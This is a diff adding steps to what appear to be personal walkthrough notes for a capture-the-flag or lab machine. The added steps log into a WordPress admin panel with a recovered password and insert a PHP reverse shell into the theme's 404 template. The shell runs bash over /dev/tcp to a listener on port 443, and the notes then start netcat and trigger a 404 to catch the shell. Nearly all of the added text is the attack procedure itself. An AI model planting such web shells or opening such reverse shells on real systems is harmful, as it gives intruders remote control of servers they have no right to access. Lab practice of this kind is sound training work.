@@ -73,4 +73,21 @@ PW: ?
         C. Password
                 ER28-0652
 
+4. Connect to LocalHost
+        A. LogIn
+                Website: 10.10.30.50/login
+                User: elliot
+                PW: ER28-0652
 
+        B. Add Shell to Wordpress
+                Appearances > Editor > 404 Template
+
+                Add: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.1.50/443 0>&1'");?>
+
+                Update File
+
+        C. Set up Listening on Local Machine
+                nc -lvp 443
+
+        D. Force connection
+                10.10.30.50/safdsfhsdakfhsdkfhsk (forces 404 error and allows local to listen)
